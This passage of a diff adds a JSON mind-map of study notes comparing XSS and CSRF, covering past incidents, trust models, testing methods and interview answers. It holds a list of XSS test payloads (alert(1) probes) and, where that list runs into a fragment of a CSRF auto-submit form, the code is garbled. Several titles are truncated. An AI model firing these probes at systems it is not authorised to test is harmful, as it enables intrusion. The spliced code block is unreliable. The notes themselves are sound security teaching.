+                  "id": "n51685e4755f759c",
+                  "title": "A new filter was created that forwarded all emails matching specific criteria to the att",
+                  "markdown": "- A new filter was created that forwarded all emails matching specific criteria to the att",
+                  "notes": "A new filter was created that forwarded all emails matching specific criteria to the att",
+                  "blurb": "A new filter was created that forwarded all emails matching specific...",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nb6acea053509971",
+                  "title": "The attacker silently received copies of the victim's emails",
+                  "markdown": "- The attacker silently received copies of the victim's emails",
+                  "notes": "The attacker silently received copies of the victim's emails",
+                  "blurb": "The attacker silently received copies of the victim's emails",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "A CSRF vulnerability in Gmail allowed attackers to create email forwarding...",
+              "expanded": false
+            },
+            {
+              "id": "n68a1594ddd6994b",
+              "title": "Netflix Account Takeover (2006)",
+              "markdown": "Researchers discovered CSRF vulnerabilities in Netflix that allowed:",
+              "notes": "Researchers discovered CSRF vulnerabilities in Netflix that allowed:",
+              "kind": "topic",
+              "level": 4,
+              "children": [
+                {
+                  "id": "n142f09e05dc452f",
+                  "title": "Changing the shipping address for DVD rentals",
+                  "markdown": "- Changing the shipping address for DVD rentals",
+                  "notes": "Changing the shipping address for DVD rentals",
+                  "blurb": "Changing the shipping address for DVD rentals",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n154dcd1b59d5d27",
+                  "title": "Adding movies to the victim's queue",
+                  "markdown": "- Adding movies to the victim's queue",
+                  "notes": "Adding movies to the victim's queue",
+                  "blurb": "Adding movies to the victim's queue",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n42e47d3e902d2b6",
+                  "title": "Changing account credentials",
+                  "markdown": "- Changing account credentials",
+                  "notes": "Changing account credentials",
+                  "blurb": "Changing account credentials",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nf041f897bd50df4",
+                  "title": "In combination, achieving full account takeover",
+                  "markdown": "- In combination, achieving full account takeover",
+                  "notes": "In combination, achieving full account takeover",
+                  "blurb": "In combination, achieving full account takeover",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "Researchers discovered CSRF vulnerabilities in Netflix that allowed:",
+              "expanded": false
+            },
+            {
+              "id": "n0b73176a2503eae",
+              "title": "ING Direct (Banking)",
+              "markdown": "A CSRF vulnerability in ING Direct's banking application allowed attackers to:",
+              "notes": "A CSRF vulnerability in ING Direct's banking application allowed attackers to:",
+              "kind": "topic",
+              "level": 4,
+              "children": [
+                {
+                  "id": "n6e517393d8dc1bb",
+                  "title": "Open additional accounts in the victim's name",
+                  "markdown": "- Open additional accounts in the victim's name",
+                  "notes": "Open additional accounts in the victim's name",
+                  "blurb": "Open additional accounts in the victim's name",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n1ad98763f83dbbd",
+                  "title": "Transfer funds from the victim's existing accounts to the newly created accounts",
+                  "markdown": "- Transfer funds from the victim's existing accounts to the newly created accounts",
+                  "notes": "Transfer funds from the victim's existing accounts to the newly created accounts",
+                  "blurb": "Transfer funds from the victim's existing accounts to the newly created...",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nd7456187bc72662",
+                  "title": "The attack exploited the lack of re-authentication for fund transfers",
+                  "markdown": "- The attack exploited the lack of re-authentication for fund transfers",
+                  "notes": "The attack exploited the lack of re-authentication for fund transfers",
+                  "blurb": "The attack exploited the lack of re-authentication for fund transfers",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "A CSRF vulnerability in ING Direct's banking application allowed attackers to:",
+              "expanded": false
+            }
+          ],
+          "blurb": "Includes Gmail Email Filter Attack (2007)",
+          "expanded": false
+        }
+      ],
+      "blurb": "Includes Famous XSS Attacks",
+      "expanded": false
+    },
+    {
+      "id": "n8d586271649b353",
+      "title": "Fundamental Differences",
+      "markdown": "",
+      "notes": "",
+      "kind": "topic",
+      "level": 2,
+      "children": [
+        {
+          "id": "n24be784b604e999",
+          "title": "What Each Attack Does",
+          "markdown": "",
+          "notes": "",
+          "kind": "topic",
+          "level": 3,
+          "children": [
+            {
+              "id": "n7db70ef2f816e74",
+              "title": "XSS (Cross-Site Scripting)",
+              "markdown": "XSS occurs when an application includes attacker-controlled data in its output without proper encoding or sanitization, allowing the attacker to inject and execute arbitrary JavaScript in the context of a trusted origin.\n\n**Core characteristics:**",
+              "notes": "XSS occurs when an application includes attacker-controlled data in its output without proper encoding or sanitization, allowing the attacker to inject and execute arbitrary JavaScript in the context of a trusted origin.\n\nCore characteristics:",
+              "kind": "topic",
+              "level": 4,
+              "children": [
+                {
+                  "id": "na062b7000fac7ba",
+                  "title": "Injects malicious scripts into a trusted website's pages",
+                  "markdown": "- Injects malicious scripts into a trusted website's pages",
+                  "notes": "Injects malicious scripts into a trusted website's pages",
+                  "blurb": "Injects malicious scripts into a trusted website's pages",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n5b89625f2b58e24",
+                  "title": "The injected code executes in the victim's browser within the application's origin",
+                  "markdown": "- The injected code executes in the victim's browser within the application's origin",
+                  "notes": "The injected code executes in the victim's browser within the application's origin",
+                  "blurb": "The injected code executes in the victim's browser within the application's...",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n5c5b481d8f66472",
+                  "title": "Can read the DOM, access cookies (unless HttpOnly), interact with APIs, modify page cont",
+                  "markdown": "- Can read the DOM, access cookies (unless HttpOnly), interact with APIs, modify page cont",
+                  "notes": "Can read the DOM, access cookies (unless HttpOnly), interact with APIs, modify page cont",
+                  "blurb": "Can read the DOM, access cookies (unless HttpOnly), interact with APIs,...",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nca4916b40a16241",
+                  "title": "The attacker gains the full privileges of the application's JavaScript context",
+                  "markdown": "- The attacker gains the full privileges of the application's JavaScript context",
+                  "notes": "The attacker gains the full privileges of the application's JavaScript context",
+                  "blurb": "The attacker gains the full privileges of the application's JavaScript context",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "XSS occurs when an application includes attacker-controlled data in its...",
+              "expanded": false
+            },
+            {
+              "id": "n99af79af4e3cb21",
+              "title": "CSRF (Cross-Site Request Forgery)",
+              "markdown": "CSRF occurs when an attacker tricks a victim's browser into sending an authenticated request to a target application without the user's knowledge or intent. The attack leverages the browser's automatic inclusion of session cookies with every request to the target origin.\n\n**Core characteristics:**",
+              "notes": "CSRF occurs when an attacker tricks a victim's browser into sending an authenticated request to a target application without the user's knowledge or intent. The attack leverages the browser's automatic inclusion of session cookies with every request to the target origin.\n\nCore characteristics:",
+              "kind": "topic",
+              "level": 4,
+              "children": [
+                {
+                  "id": "nfa075e98f708692",
+                  "title": "Tricks the victim's browser into making unwanted requests to a site where they are authe",
+                  "markdown": "- Tricks the victim's browser into making unwanted requests to a site where they are authe",
+                  "notes": "Tricks the victim's browser into making unwanted requests to a site where they are authe",
+                  "blurb": "Tricks the victim's browser into making unwanted requests to a site where...",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n4b30e34519a83d0",
+                  "title": "Exploits the browser's automatic cookie-sending behavior",
+                  "markdown": "- Exploits the browser's automatic cookie-sending behavior",
+                  "notes": "Exploits the browser's automatic cookie-sending behavior",
+                  "blurb": "Exploits the browser's automatic cookie-sending behavior",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n682cf2393627b29",
+                  "title": "The attacker cannot read the response - same-origin policy prevents cross-origin respons",
+                  "markdown": "- The attacker cannot read the response - same-origin policy prevents cross-origin respons",
+                  "notes": "The attacker cannot read the response - same-origin policy prevents cross-origin respons",
+                  "blurb": "The attacker cannot read the response - same-origin policy prevents...",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n2a7dbc4e1059098",
+                  "title": "Forces state-changing actions only (fund transfers, password changes, email updates, pri",
+                  "markdown": "- Forces state-changing actions only (fund transfers, password changes, email updates, pri",
+                  "notes": "Forces state-changing actions only (fund transfers, password changes, email updates, pri",
+                  "blurb": "Forces state-changing actions only (fund transfers, password changes, email...",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n45bb30993e3e84c",
+                  "title": "The attacker is \"blind\" - they fire the request and hope it succeeds",
+                  "markdown": "- The attacker is \"blind\" - they fire the request and hope it succeeds",
+                  "notes": "The attacker is \"blind\" - they fire the request and hope it succeeds",
+                  "blurb": "The attacker is \"blind\" - they fire the request and hope it succeeds",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "CSRF occurs when an attacker tricks a victim's browser into sending an...",
+              "expanded": false
+            }
+          ],
+          "blurb": "Includes XSS (Cross-Site Scripting)",
+          "expanded": false
+        },
+        {
+          "id": "n1e3eb3d73575198",
+          "title": "Trust Model Comparison",
+          "markdown": "| Aspect | XSS | CSRF |\n|--------|-----|------|\n| **Trust exploited** | User trusts the website (browser executes code from trusted origin) | Server trusts the user's browser (accepts requests with valid session cookie) |\n| **Attacker's goal** | Execute arbitrary code in victim's browser context | Perform state-changing actions as the victim |\n| **Data exfiltration** | Yes - can read DOM, cookies, localStorage, API responses | No - cannot read responses (same-origin policy) |\n| **Requires authentication** | No (but far more damaging if victim is authenticated) | Yes (the entire attack depends on an existing session) |\n| **Attacker interaction** | Can be interactive - persistent code that responds, keylogging, real-time exfil | Fire-and-forget - single blind request |\n| **Victim interaction** | Reflected: click link; Stored: visit page; DOM: navigate to crafted URL | Visit attacker's page or click attacker's link |\n| **Same-origin policy** | Bypassed - code runs *within* the trusted origin | Enforced - attacker cannot read cross-origin responses |\n| **Persistence** | Stored XSS persists until the payload is removed | Each attack is a one-time action |",
+          "notes": "| Aspect | XSS | CSRF |\n|--------|-----|------|\n| Trust exploited | User trusts the website (browser executes code from trusted origin) | Server trusts the user's browser (accepts requests with valid session cookie) |\n| Attacker's goal | Execute arbitrary code in victim's browser context | Perform state-changing actions as the victim |\n| Data exfiltration | Yes - can read DOM, cookies, localStorage, API responses | No - cannot read responses (same-origin policy) |\n| Requires authentication | No (but far more damaging if victim is authenticated) | Yes (the entire attack depends on an existing session) |\n| Attacker interaction | Can be interactive - persistent code that responds, keylogging, real-time exfil | Fire-and-forget - single blind request |\n| Victim interaction | Reflected: click link; Stored: visit page; DOM: navigate to crafted URL | Visit attacker's page or click attacker's link |\n| Same-origin policy | Bypassed - code runs within the trusted origin | Enforced - attacker cannot read cross-origin responses |\n| Persistence | Stored XSS persists until the payload is removed | Each attack is a one-time action |",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "| Aspect | XSS | CSRF | |--------|-----|------| | Trust exploited | User...",
+          "expanded": false
+        }
+      ],
+      "blurb": "Includes What Each Attack Does",
+      "expanded": false
+    },
+    {
+      "id": "n66d80a08c1f6e0e",
+      "title": "Testing Comparison",
+      "markdown": "",
+      "notes": "",
+      "kind": "topic",
+      "level": 2,
+      "children": [
+        {
+          "id": "n5eb2f087a6790c8",
+          "title": "Testing for XSS",
+          "markdown": "**Manual testing approach:**\n\n1. **Identify all input vectors** - form fields, URL parameters, headers (User-Agent, Referer), file uploads, API bodies, WebSocket messages\n2. **Inject test payloads** - context-aware probes, not just `<script>alert(1)</script>`\n3. **Check output encoding** - inspect the HTML source to see how your input is rendered\n4. **Test different contexts** - HTML body, attributes, JavaScript, URLs, CSS\n\n**Context-aware test payloads:**\n\n```\nHTML context:       <img src=x onerror=alert(1)>\nAttribute context:  \" onfocus=alert(1) autofocus=\"\nJS string context:  ';alert(1);//\nJS template lit:    ${alert(1)}\nURL context:        javascript:alert(1)\nCSS context:        expression(alert(1))  /* IE legacy */\nSVG context:        <svg onload=alert(1)>\nMathML context:     <math><mtext><table><mglyph><style>\n\n  </form>\n  <script>\n    document.getElementById('csrf').submit();\n  </script>\n</body>\n</html>\n```\n\n**Automated tools:**",
+          "notes": "Manual testing approach:\n\n1. Identify all input vectors - form fields, URL parameters, headers (User-Agent, Referer), file uploads, API bodies, WebSocket messages\n2. Inject test payloads - context-aware probes, not just <script>alert(1)</script>\n3. Check output encoding - inspect the HTML source to see how your input is rendered\n4. Test different contexts - HTML body, attributes, JavaScript, URLs, CSS\n\nContext-aware test payloads:\n\nHTML context:       <img src=x onerror=alert(1)>\nAttribute context:  \" onfocus=alert(1) autofocus=\"\nJS string context:  ';alert(1);//\nJS template lit:    ${alert(1)}\nURL context:        javascript:alert(1)\nCSS context:        expression(alert(1))  / IE legacy /\nSVG context:        <svg onload=alert(1)>\nMathML context:     <math><mtext><table><mglyph><style>\n\n  </form>\n  <script>\n    document.getElementById('csrf').submit();\n  </script>\n</body>\n</html>\n\nAutomated tools:",
+          "kind": "topic",
+          "level": 3,
+          "children": [
+            {
+              "id": "ne6241cb7f5e1fa9",
+              "title": "Burp Suite - CSRF PoC generator, passive checks for missing tokens",
+              "markdown": "- Burp Suite - CSRF PoC generator, passive checks for missing tokens",
+              "notes": "Burp Suite - CSRF PoC generator, passive checks for missing tokens",
+              "blurb": "Burp Suite - CSRF PoC generator, passive checks for missing tokens",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "nb7d396c656b5439",
+              "title": "OWASP ZAP - anti-CSRF token detection",
+              "markdown": "- OWASP ZAP - anti-CSRF token detection",
+              "notes": "OWASP ZAP - anti-CSRF token detection",
+              "blurb": "OWASP ZAP - anti-CSRF token detection",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "naedd9af4447bfea",
+              "title": "CSRFTester (OWASP) - dedicated CSRF testing tool",
+              "markdown": "- CSRFTester (OWASP) - dedicated CSRF testing tool",
+              "notes": "CSRFTester (OWASP) - dedicated CSRF testing tool",
+              "blurb": "CSRFTester (OWASP) - dedicated CSRF testing tool",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "expanded": false
+            }
+          ],
+          "blurb": "Manual testing approach: 1.",
+          "expanded": false
+        },
+        {
+          "id": "n9dbfc654523eed6",
+          "title": "Testing Comparison Table",
+          "markdown": "| Aspect | XSS Testing | CSRF Testing |\n|--------|-------------|--------------|\n| **Primary technique** | Payload injection in inputs | Remove/modify tokens in requests |\n| **What to look for** | Unencoded output in response | Missing or unenforced tokens |\n| **Automation** | Highly automatable (scanners) | Partially automatable |\n| **False positives** | Common (encoded but still flagged) | Rare (either token is checked or it isn't) |\n| **Skill required** | High (context-dependent encoding) | Moderate (mostly systematic checking) |\n| **Time to test** | Longer (many inputs, contexts) | Shorter (focus on state-changing ops) |",
+          "notes": "| Aspect | XSS Testing | CSRF Testing |\n|--------|-------------|--------------|\n| Primary technique | Payload injection in inputs | Remove/modify tokens in requests |\n| What to look for | Unencoded output in response | Missing or unenforced tokens |\n| Automation | Highly automatable (scanners) | Partially automatable |\n| False positives | Common (encoded but still flagged) | Rare (either token is checked or it isn't) |\n| Skill required | High (context-dependent encoding) | Moderate (mostly systematic checking) |\n| Time to test | Longer (many inputs, contexts) | Shorter (focus on state-changing ops) |",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "| Aspect | XSS Testing | CSRF Testing |...",
+          "expanded": false
+        }
+      ],
+      "blurb": "Includes Testing for XSS",
+      "expanded": false
+    },
+    {
+      "id": "nfadc3864595f07c",
+      "title": "Common Interview Questions",
+      "markdown": "",
+      "notes": "",
+      "kind": "topic",
+      "level": 2,
+      "children": [
+        {
+          "id": "nf5caf39e5717d0c",
+          "title": "\"What's the difference between XSS and CSRF?\"",
+          "markdown": "**Ideal answer template:**\n\n> \"XSS and CSRF exploit trust in opposite directions. XSS exploits the user's trust in a website - the browser executes malicious code because it was served from a trusted origin. CSRF exploits the website's trust in the user's browser - the server processes a request because the browser automatically attached valid session cookies.\n>\n> With XSS, the attacker can execute arbitrary JavaScript in the victim's browser, which means they can read data, steal credentials, and perform any action the user can. With CSRF, the attacker can only force the victim's browser to perform specific actions - they cannot read responses, so it's a blind, write-only attack.\n>\n> The defenses are different too: XSS is primarily prevented by output encoding and CSP, while CSRF is prevented by anti-CSRF tokens and SameSite cookies. Critically, XSS can bypass CSRF protections because the injected script operates within the same origin.\"",
+          "notes": "Ideal answer template:\n\n> \"XSS and CSRF exploit trust in opposite directions. XSS exploits the user's trust in a website - the browser executes malicious code because it was served from a trusted origin. CSRF exploits the website's trust in the user's browser - the server processes a request because the browser automatically attached valid session cookies.\n>\n> With XSS, the attacker can execute arbitrary JavaScript in the victim's browser, which means they can read data, steal credentials, and perform any action the user can. With CSRF, the attacker can only force the victim's browser to perform specific actions - they cannot read responses, so it's a blind, write-only attack.\n>\n> The defenses are different too: XSS is primarily prevented by output encoding and CSP, while CSRF is prevented by anti-CSRF tokens and SameSite cookies. Critically, XSS can bypass CSRF protections because the injected script operates within the same origin.\"",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "Ideal answer template: > \"XSS and CSRF exploit trust in opposite directions.",
+          "expanded": false
+        },
+        {
+          "id": "na9b82595749b6fb",
+          "title": "\"Can XSS lead to CSRF?\"",
+          "markdown": "**Answer:**\n\n> \"Yes, and this is a crucial point. If an attacker has XSS on the target application, they can bypass all CSRF defenses because their script runs within the same origin. The script can read CSRF tokens from forms or meta tags, set custom headers, and the browser will include SameSite cookies since the request originates from the same site. Essentially, XSS subsumes CSRF - an XSS vulnerability makes CSRF protections irrelevant for that application.\"",
+          "notes": "Answer:\n\n> \"Yes, and this is a crucial point. If an attacker has XSS on the target application, they can bypass all CSRF defenses because their script runs within the same origin. The script can read CSRF tokens from forms or meta tags, set custom headers, and the browser will include SameSite cookies since the request originates from the same site. Essentially, XSS subsumes CSRF - an XSS vulnerability makes CSRF protections irrelevant for that application.\"",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "Answer: > \"Yes, and this is a crucial point.",
+          "expanded": false
+        },
+        {
+          "id": "n14a7ef3b61086a7",
+          "title": "\"If you could only fix one vulnerability \u2014 XSS or CSRF \u2014 which would you prioritize?\"",
+          "markdown": "**Answer:**\n\n> \"XSS, without hesitation. There are three reasons. First, XSS is strictly more powerful - it can do everything CSRF can do, plus read data, steal credentials, and maintain persistent access. Second, XSS defeats CSRF protections - if XSS exists, CSRF tokens, SameSite cookies, and custom headers are all bypassed. Third, modern browsers have significantly reduced CSRF risk through default SameSite=Lax behavior, whereas there's no equivalent browser-level XSS mitigation that works without developer effort.\n>\n> That said, in practice, you should always fix both. Defense-in-depth requires addressing each vulnerability class independently.\"",
+          "notes": "Answer:\n\n> \"XSS, without hesitation. There are three reasons. First, XSS is strictly more powerful - it can do everything CSRF can do, plus read data, steal credentials, and maintain persistent access. Second, XSS defeats CSRF protections - if XSS exists, CSRF tokens, SameSite cookies, and custom headers are all bypassed. Third, modern browsers have significantly reduced CSRF risk through default SameSite=Lax behavior, whereas there's no equivalent browser-level XSS mitigation that works without developer effort.\n>\n> That said, in practice, you should always fix both. Defense-in-depth requires addressing each vulnerability class independently.\"",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "Answer: > \"XSS, without hesitation.",
+          "expanded": false
+        },
+        {
+          "id": "neebb4b2cfc48004",
+          "title": "\"How does SameSite=Lax help with CSRF but not XSS?\"",
+          "markdown": "**Answer:**\n\n> \"SameSite=Lax tells the browser not to send cookies with cross-site POST requests, iframes, or AJAX calls - only with top-level GET navigations. This prevents CSRF because the attacker's malicious page (a different site) triggers a cross-site POST that won't include the session cookie.\n>\n> But SameSite does nothing for XSS because an XSS payload executes on the *same site*. From the browser's perspective, the malicious JavaScript is part of the trusted application. All cookie restrictions based on site boundaries are satisfied because there is no cross-site boundary being crossed.\"",
+          "notes": "Answer:\n\n> \"SameSite=Lax tells the browser not to send cookies with cross-site POST requests, iframes, or AJAX calls - only with top-level GET navigations. This prevents CSRF because the attacker's malicious page (a different site) triggers a cross-site POST that won't include the session cookie.\n>\n> But SameSite does nothing for XSS because an XSS payload executes on the same site. From the browser's perspective, the malicious JavaScript is part of the trusted application. All cookie restrictions based on site boundaries are satisfied because there is no cross-site boundary being crossed.\"",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "Answer: > \"SameSite=Lax tells the browser not to send cookies with...",
+          "expanded": false
+        },
+        {
+          "id": "naf6b499a46e4615",
+          "title": "\"A penetration test found both XSS and CSRF in your application. How do you prioritize remediation?\"",
+          "markdown": "**Answer:**\n\n> \"I would prioritize XSS remediation first, because:\n>\n> 1. **XSS nullifies CSRF defenses.** As long as XSS exists, adding CSRF tokens provides no real protection - the XSS script can extract and use them.\n> 2. **XSS has broader impact.** Beyond performing actions, XSS enables data exfiltration, credential theft, session hijacking, and persistent compromise.\n> 3. **XSS is harder to fix retroactively.** It requires systematic output encoding across every rendering context, which is more complex than adding CSRF tokens to forms.\n>\n> For the XSS fixes, I'd prioritize stored XSS over reflected XSS (stored affects all visitors, reflected requires individual targeting). Then I'd add CSRF protections as a second phase, along with deploying SameSite=Lax on all session cookies as a quick interim measure.\n>\n> I'd also deploy CSP in report-only mode immediately to gain visibility into injection vectors while the fixes are being implemented.\"",
+          "notes": "Answer:\n\n> \"I would prioritize XSS remediation first, because:\n>\n> 1. XSS nullifies CSRF defenses. As long as XSS exists, adding CSRF tokens provides no real protection - the XSS script can extract and use them.\n> 2. XSS has broader impact. Beyond performing actions, XSS enables data exfiltration, credential theft, session hijacking, and persistent compromise.\n> 3. XSS is harder to fix retroactively. It requires systematic output encoding across every rendering context, which is more complex than adding CSRF tokens to forms.\n>\n> For the XSS fixes, I'd prioritize stored XSS over reflected XSS (stored affects all visitors, reflected requires individual targeting). Then I'd add CSRF protections as a second phase, along with deploying SameSite=Lax on all session cookies as a quick interim measure.\n>\n> I'd also deploy CSP in report-only mode immediately to gain visibility into injection vectors while the fixes are being implemented.\"",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "Answer: > \"I would prioritize XSS remediation first, because: > > 1.",
+          "expanded": false
+        },
+        {
+          "id": "n7344fd3352f47f2",
+          "title": "\"Can CSRF steal data?\"",
+          "markdown": "**Answer:**\n\n> \"No. CSRF is fundamentally a blind, write-only attack. The attacker can force the victim's browser to send a request, but the same-origin policy prevents the attacker from reading the response. The attacker can cause state changes - transfer money, change an email, delete records - but cannot directly read the response containing account balances, personal information, or other data.\n>\n> There is one exception: if the application returns sensitive data in response to a GET request, and the data is in a format that can be parsed cross-origin (like JSONP or certain JavaScript array/object formats), then a CSRF-like attack could exfiltrate data. This is technically a cross-origin data leakage issue rather than classical CSRF, but it uses similar mechanics.\"",
+          "notes": "Answer:\n\n> \"No. CSRF is fundamentally a blind, write-only attack. The attacker can force the victim's browser to send a request, but the same-origin policy prevents the attacker from reading the response. The attacker can cause state changes - transfer money, change an email, delete records - but cannot directly read the response containing account balances, personal information, or other data.\n>\n> There is one exception: if the application returns sensitive data in response to a GET request, and the data is in a format that can be parsed cross-origin (like JSONP or certain JavaScript array/object formats), then a CSRF-like attack could exfiltrate data. This is technically a cross-origin data leakage issue rather than classical CSRF, but it uses similar mechanics.\"",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "",
+          "expanded": false
+        },
+        {
+          "id": "ncff543a5bee59a1",
+          "title": "\"Your application uses a REST API with JWT tokens in the Authorization header (not cookies). Is it vulnerable to CSRF?\"",
+          "markdown": "**Answer:**\n\n> \"No, it is not vulnerable to traditional CSRF. CSRF relies on the browser *automatically* attaching credentials to requests. Cookies are sent automatically; Authorization headers are not. If the JWT is stored in localStorage and explicitly added to each request via JavaScript, the browser will not include it in cross-origin form submissions or image loads.\n>\n> However, there are related risks. If the JWT is stored in a cookie (sometimes done for SSR or to avoid localStorage XSS exposure), then CSRF is back in play. Also, regardless of CSRF, the JWT in localStorage is vulnerable to theft via XSS. So the authentication architecture trades CSRF immunity for increased XSS sensitivity.\"",
+          "notes": "Answer:\n\n> \"No, it is not vulnerable to traditional CSRF. CSRF relies on the browser automatically attaching credentials to requests. Cookies are sent automatically; Authorization headers are not. If the JWT is stored in localStorage and explicitly added to each request via JavaScript, the browser will not include it in cross-origin form submissions or image loads.\n>\n> However, there are related risks. If the JWT is stored in a cookie (sometimes done for SSR or to avoid localStorage XSS exposure), then CSRF is back in play. Also, regardless of CSRF, the JWT in localStorage is vulnerable to theft via XSS. So the authentication architecture trades CSRF immunity for increased XSS sensitivity.\"",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "Answer: > \"No, it is not vulnerable to traditional CSRF.",
+          "expanded": false
+        }
+      ],
+      "blurb": "Includes \"What's the difference between XSS and CSRF?\"",
+      "expanded": false
+    },
+    {
+      "id": "n49132a340749860",
+      "title": "Quick Comparison Matrix",
+      "markdown": "| Dimension | XSS | CSRF |\n|-----------|-----|------|\n| **Full name** | Cross-Site Scripting | Cross-Site Request Forgery |\n| **CWE ID** | CWE-79 | CWE-352 |\n| **OWASP Top 10 (2021)** | A03: Injection | A01: Broken Access Control |\n| **Trust exploited** | User trusts the website | Website trusts the user's browser |\n| **Attack vector** | Script injection into web pages | Forged requests from external pages |\n| **Execution context** | Client-side (victim's browser) | Server-side (processes forged request) |\n| **Requires authentication** | No (but more impactful if authenticated) | Yes (depends on session cookies) |\n| **Can read data** | Yes (DOM, cookies, APIs, localStorage) | No (blind/write-only) |\n| **Can modify data** | Yes | Yes (the primary goal) |\n| **Can steal credentials** | Yes (keyloggers, fake forms, cookie theft) | No |\n| **Persistence** | Stored XSS persists; Reflected/DOM are transient | One-time per victim interaction |\n| **Victim interaction** | View page (stored) or click link (reflected) | Visit attacker's page |\n| **Same-origin policy** | Bypassed (code runs within trusted origin) | Enforced (cannot read cross-origin responses) |\n| **Primary defense** | Output encoding | Synchronizer tokens |\n| **Secondary defenses** | CSP, Trusted Types, framework escaping | SameSite cookies, custom headers, origin validation |\n| **Impact on other defenses** | XSS defeats CSRF protections | CSRF cannot bypass XSS defenses |\n| **Browser evolution** | No significant automatic protection | SameSite=Lax default dramatically reduces risk |\n| **Severity (typical)** | Higher (more versatile, data exfil) | Lower (blind, action-only) |\n| **Testing complexity** | High (many contexts, encoding rules) | Moderate (systematic token checking) |\n| **Fix complexity** | High (systematic encoding across codebase) | Moderate (add token framework) |\n| **Automated detection** | Good (scanners, SAST) | Good (missing token detection) |\n| **Worm potential** | Yes (Samy worm, TweetDeck) | No (cannot self-propagate) |",
+      "notes": "| Dimension | XSS | CSRF |\n|-----------|-----|------|\n| Full name | Cross-Site Scripting | Cross-Site Request Forgery |\n| CWE ID | CWE-79 | CWE-352 |\n| OWASP Top 10 (2021) | A03: Injection | A01: Broken Access Control |\n| Trust exploited | User trusts the website | Website trusts the user's browser |\n| Attack vector | Script injection into web pages | Forged requests from external pages |\n| Execution context | Client-side (victim's browser) | Server-side (processes forged request) |\n| Requires authentication | No (but more impactful if authenticated) | Yes (depends on session cookies) |\n| Can read data | Yes (DOM, cookies, APIs, localStorage) | No (blind/write-only) |\n| Can modify data | Yes | Yes (the primary goal) |\n| Can steal credentials | Yes (keyloggers, fake forms, cookie theft) | No |\n| Persistence | Stored XSS persists; Reflected/DOM are transient | One-time per victim interaction |\n| Victim interaction | View page (stored) or click link (reflected) | Visit attacker's page |\n| Same-origin policy | Bypassed (code runs within trusted origin) | Enforced (cannot read cross-origin responses) |\n| Primary defense | Output encoding | Synchronizer tokens |\n| Secondary defenses | CSP, Trusted Types, framework escaping | SameSite cookies, custom headers, origin validation |\n| Impact on other defenses | XSS defeats CSRF protections | CSRF cannot bypass XSS defenses |\n| Browser evolution | No significant automatic protection | SameSite=Lax default dramatically reduces risk |\n| Severity (typical) | Higher (more versatile, data exfil) | Lower (blind, action-only) |\n| Testing complexity | High (many contexts, encoding rules) | Moderate (systematic token checking) |\n| Fix complexity | High (systematic encoding across codebase) | Moderate (add token framework) |\n| Automated detection | Good (scanners, SAST) | Good (missing token detection) |\n| Worm potential | Yes (Samy worm, TweetDeck) | No (cannot self-propagate) |",
+      "kind": "topic",
+      "level": 2,
+      "children": [],
+      "blurb": "| Dimension | XSS | CSRF | |-----------|-----|------| | Full name |...",
+      "expanded": false
+    },
+    {
+      "id": "n72a7a37ddd38dba",
+      "title": "Quick recall",
+      "markdown": "| Aspect | XSS | CSRF |\n| --- | --- | --- |\n| **Attack Goal** | Execute scripts in browser | Trick user into submitting request |\n| **Execution Location** | Browser (client-side) | Server (server-side) |\n| **Target** | Other users | Authenticated users (usually victim) |\n| **Attack Vector** | Script injection | Form submission |\n| **Requires Auth?** | No | Yes |\n| **Primary Prevention** | Output encoding | CSRF tokens |\n| **Secondary Prevention** | CSP | SameSite cookies |\n| **Attack Example** | `<script>alert(1)</script>` | `<form><input></form>` |",
